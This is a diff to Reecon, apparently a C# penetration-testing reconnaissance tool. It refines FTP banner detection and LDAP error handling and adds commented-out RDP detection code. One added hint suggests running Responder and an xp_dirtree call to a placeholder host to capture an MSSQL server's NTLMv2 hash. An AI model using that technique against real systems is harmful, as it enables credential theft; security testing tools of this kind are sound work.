@@ -227,7 +227,7 @@ namespace Reecon
                     Console.WriteLine(unknownPortResult + Environment.NewLine);
                 }
                 // FTP
-                else if (theBanner.StartsWith("220 ") && theBanner.Contains("FTP"))
+                else if (theBanner.StartsWith("220 ") && theBanner.ToUpper().Contains("FTP")) // ToUpper for things like pyftpdlib / FreeFloat Ftp Server
                 {
                     unknownPortResult += $"Port {port} - FTP".Pastel(Color.Green) + Environment.NewLine;
                     unknownPortResult += FTP.GetInfo(target, port);
@@ -466,7 +466,15 @@ namespace Reecon
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("- Error: Unable to retrieve DefaultNamingContext: " + ex.Message + Environment.NewLine);
+                    if (ex.InnerException.ToString().StartsWith("System.DllNotFoundException: Unable to load shared library 'libldap-2.4.so.2'"))
+                    {
+                        postScanActions += $"- Error: You need a third-party DLL to run LDAP stuff on Linux. Download + dpkg -i https://packages.ubuntu.com/focal-updates/amd64/libldap-2.4-2/download" + Environment.NewLine;
+                        postScanActions += $"-- Note: If you're currently an ARM user, you're a bit out of luck: https://github.com/dotnet/runtime/issues/69456" + Environment.NewLine;
+                    }
+                    else
+                    {
+                        postScanActions += $"- Error: Unable to retrieve DefaultNamingContext: " + ex.Message + " <--> " + ex.InnerException + Environment.NewLine;
+                    }
                 }
                 defaultNamingContext = defaultNamingContext.Replace("DC=", "").Replace("dc=", "").Replace(",", ".");
 
@@ -510,6 +518,7 @@ namespace Reecon
             else if (port == 1433)
             {
                 postScanActions += $"- MSSQL - Nmap has more: sudo nmap {target} -p 1433 --script ms-sql-info" + Environment.NewLine;
+                postScanActions += @"- MSSQL - If you connect, run responder, and try get the NTLMv2 hash: exec xp_dirtree '\\yourip\anythinghere'" + Environment.NewLine;
             }
             else if (port == 2049)
             {
@@ -548,6 +557,30 @@ namespace Reecon
                 byte[] byteData = General.StringToByteArray(NTLM_NEGOTIATE_BLOB);
                 string result = General.BannerGrabBytes(ip, port, byteData);
                 Console.WriteLine("Result: " + result);
+
+                // Connect to the specified port on localhost.
+                TcpClient client = new TcpClient("localhost", port);
+
+                // Get the network stream from the connected client.
+                NetworkStream stream = client.GetStream();
+
+                // Read the stream into a byte array.
+                byte[] data = new byte[client.ReceiveBufferSize];
+                int bytesRead = stream.Read(data, 0, Convert.ToInt32(client.ReceiveBufferSize));
+
+                // Check if the data is the RDP protocol identifier.
+                if (bytesRead >= 12 && data[8] == 0x03 && data[9] == 0x00 && data[10] == 0x00 && data[11] == 0x0B)
+                {
+                    Console.WriteLine("The server is an RDP server.");
+                }
+                else
+                {
+                    Console.WriteLine("The server is not an RDP server.");
+                }
+
+                // Close the client and the stream.
+                stream.Close();
+                client.Close();
                 */
             }
             else if (port == 3690)
